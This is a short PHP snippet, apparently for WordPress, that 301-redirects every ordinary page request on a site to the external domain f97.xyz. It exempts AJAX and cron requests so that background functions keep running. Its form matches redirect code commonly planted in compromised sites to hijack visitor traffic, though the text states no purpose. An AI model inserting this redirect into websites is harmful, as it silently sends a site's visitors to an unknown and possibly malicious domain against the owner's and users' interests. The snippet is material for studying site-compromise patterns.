<?php
// Define the target domain you want to redirect to
$target_domain = 'https://f97.xyz'; 

// Check if it's an ajax or cron request, then do not redirect
if (defined('DOING_AJAX') || defined('DOING_CRON')) {
    return;
}

// Redirect to the target domain
header("Location: $target_domain", true, 301);
exit;
